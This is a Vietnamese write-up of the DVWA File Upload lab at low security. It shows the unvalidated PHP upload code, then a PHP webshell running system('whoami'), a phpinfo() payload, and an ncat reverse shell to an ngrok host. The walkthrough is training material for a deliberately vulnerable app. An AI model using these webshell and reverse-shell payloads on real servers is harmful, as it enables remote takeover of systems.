# Vulnerability: File Upload (DVWA)

## Đề bài

![image](https://hackmd.io/_uploads/r1syS60aa.png)

- chúng ta cần đọc các file hệ thống như phpinfo() or system()

## LOW LEVEL

### Phân tích

- đọc source code mình được

```php!
<?php

if( isset( $_POST[ 'Upload' ] ) ) {
    // Where are we going to be writing to?
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

    // Can we move the file to the upload folder?
    if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
        // No
        echo '<pre>Your image was not uploaded.</pre>';
    }
    else {
        // Yes!
        echo "<pre>{$target_path} succesfully uploaded!</pre>";
    }
}

?>
```

- Đoạn mã kiểm tra xem biến POST có tên là 'Upload' có được gửi không. Điều này cho thấy rằng biểu mẫu HTML đã được gửi đi và người dùng đã nhấn nút tải lên.

- Nó xác định đường dẫn đích mà tệp tin sẽ được tải lên. Đường dẫn này thường được định nghĩa trước trong một hằng số hoặc biến toàn cục.

- Sau đó, nó kiểm tra xem tệp tin đã được tải lên chưa bằng cách sử dụng hàm move_uploaded_file(). Hàm này di chuyển tệp tin từ vị trí tạm thời lưu trữ tới đích chỉ định.

- Nếu quá trình di chuyển không thành công, mã sẽ in ra thông báo lỗi. Ngược lại, nó sẽ in ra đường dẫn tới tệp tin đã được tải lên thành công.

vậy đoạn code xử lý upload không có cơ chế validate file được tải lên mà sẽ up được mọi file của người dùng

### Khai thác

- up 1 file ảnh bình thường `anh.png` lên trang web và thành công
- mình sửa trường `filename` thành `anh.php` và upload vẫn thành công

![image](https://hackmd.io/_uploads/BJEuwa0pp.png)

mình thử 1 webshell để xem file có được thực thi code php không

```php!
<?php echo 'SECRET' . system('whoami') . 'SECRET'; ?>
```

kết quả trả về sẽ nằm trong chuổi **SECRET**

![image](https://hackmd.io/_uploads/HkqAQ6AT6.png)

đúng như ta đã phân tích web không có cơ chế validate và mình upload thành công

- và sau đó đọc được nội dung trả về

![image](https://hackmd.io/_uploads/rJ2676RTp.png)

thử đọc file chứa thông tin chi tiết về cấu hình của máy chủ PHP với payload

```php!
<?php echo 'SECRET' . file_get_contents(phpinfo()) . 'SECRET'; ?>
```

![image](https://hackmd.io/_uploads/B1yHIpA6p.png)

và thông tin được trả ra

![image](https://hackmd.io/_uploads/r1TjBpRT6.png)

- tiếp theo mình sẽ upload RCE để đọc các file trong hệ thống dễ dàng hơn
- đầu tiên tạo 1 netcat server

![image](https://hackmd.io/_uploads/HkUqMT06a.png)

- và mình sẽ dùng ngrok để public nó ra ngoài internet với lệnh `./ngrok.exe tcp 8000`

![image](https://hackmd.io/_uploads/SkfaGTAa6.png)

sau đó mình up payload

```php!
<?php exec('ncat 0.tcp.ap.ngrok.io 19893 -e cmd.exe') . 'SECRET'; ?>
```

![image](https://hackmd.io/_uploads/BkeOMaC66.png)

- truy cập lại file mình upload và thành công lấy được shell

![image](https://hackmd.io/_uploads/rkkdE6A6T.png)

![image](https://hackmd.io/_uploads/B1lRM60Ta.png)

- tiếp đó mình đi tìm thư mục `flags` và đọc được nội dung trong thư mục này

![image](https://hackmd.io/_uploads/SkuHmpRTp.png)

![image](https://hackmd.io/_uploads/SyktmT0pp.png)

hiển thị file này trên web

![image](https://hackmd.io/_uploads/Bkghh60Ta.png)

![image](https://hackmd.io/_uploads/B1Us3aRaT.png)

vào thư mục users và thấy được có file ảnh của admin

![image](https://hackmd.io/_uploads/HyXFppRaT.png)

- truy cập nó tại `http://localhost/dvwa/hackable/users/admin.jpg`
- ![image](https://hackmd.io/_uploads/ByNgCaATT.png)
